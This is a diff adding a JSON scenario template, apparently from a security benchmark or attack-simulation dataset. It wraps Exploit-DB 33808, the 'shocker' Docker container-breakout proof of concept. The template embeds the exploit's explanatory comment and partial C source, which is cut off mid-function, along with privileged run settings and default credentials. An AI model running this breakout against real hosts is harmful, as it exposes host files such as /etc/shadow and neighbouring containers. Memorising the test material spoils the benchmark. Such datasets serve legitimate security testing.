@@ -1,0 +1,32 @@
+{
+  "template_id": "auto_edb_33808",
+  "category": "E1_docker_escape",
+  "attack_technique": "T1611",
+  "cwe": "CWE-268",
+  "description": "Linux privilege escalation: Docker 0.11 - VMM-Container Breakout (OSVDB-108257)\n\nExploit source code (33808.c):\n```\n/* shocker: docker PoC VMM-container breakout (C) 2014 Sebastian Krahmer\n *\n * Demonstrates that any given docker image someone is asking\n * you to run in your docker setup can access ANY file on your host,\n * e.g. dumping hosts /etc/shadow or other sensitive info, compromising\n * security of the host and any other docker VM's on it.\n *\n * docker using container based VMM: Sebarate pid and net namespace,\n * stripped caps and RO bind mounts into container's /. However\n * as its only a bind-mount the fs struct from the task is shared\n * with the host which allows to open files by file handles\n * (open_by_handle_at()). As we thankfully have dac_override and\n * dac_read_search we can do this. The handle is usually a 64bit\n * string with 32bit inodenumber inside (tested with ext4).\n * Inode of / is always 2, so we have a starting point to walk\n * the FS path and brute force the remaining 32bit until we find the\n * desired file (It's probably easier, depending on the fhandle export\n * function used for the FS in question: it could be a parent inode# or\n * the inode generation which can be obtained via an ioctl).\n * [In practise the remaining 32bit are all 0 :]\n *\n * tested with docker 0.11 busybox demo image on a 3.11 kernel:\n *\n * docker run -i busybox sh\n *\n * seems to run any program inside VMM with UID 0 (some caps stripped); if\n * user argument is given, the provided docker image still\n * could contain +s binaries, just as demo busybox image does.\n *\n * PS: You should also seccomp kexec() syscall :)\n * PPS: Might affect other container based compartments too\n *\n * $ cc -Wall -std=c99 -O2 shocker.c -static\n */\n\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <dirent.h>\n#include <stdint.h>\n\n\nstruct my_file_handle {\n    unsigned int handle_bytes;\n    int handle_type;\n    unsigned char f_handle[8];\n};\n\n\n\nvoid die(const char *msg)\n{\n    perror(msg);\n    exit(errno);\n}\n\n\nvoid dump_handle(const struct my_file_handle *h)\n{\n    fprintf(stderr,\"[*] #=%d, %d, char nh[] = {\", h->handle_bytes,\n            h->handle_type);\n    for (int i = 0; i < h->handle_bytes; ++i) {\n        fprintf(stderr,\"0x%02x\", h->f_handle[i]);\n        if ((i + 1) % 20 == 0)\n            fprintf(stderr,\"\\n\");\n        if (i < h->handle_bytes - 1)\n            fprintf(stderr,\", \");\n    }\n    fprintf(stderr,\"};\\n\");\n}\n\n\nint find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)\n{\n    int fd;\n    uint32_t ino = 0;\n    struct my_file_handle outh = {\n        .handle_bytes = 8,\n        .handle_type = 1\n    };\n    DIR *dir = NULL;\n    struct dirent *de = NULL;\n\n    path = strchr(path, '/');\n\n    // recursion stops if path has been resolved\n    if (!path) {\n        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));\n        oh->handle_type = 1;\n        oh->handle_bytes = 8;\n        return 1;\n    }\n    ++path\n```",
+  "cve": "OSVDB-108257",
+  "exploitdb_id": "33808",
+  "feasibility": "L2",
+  "docker_run_args": [
+    "--privileged"
+  ],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_33808",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
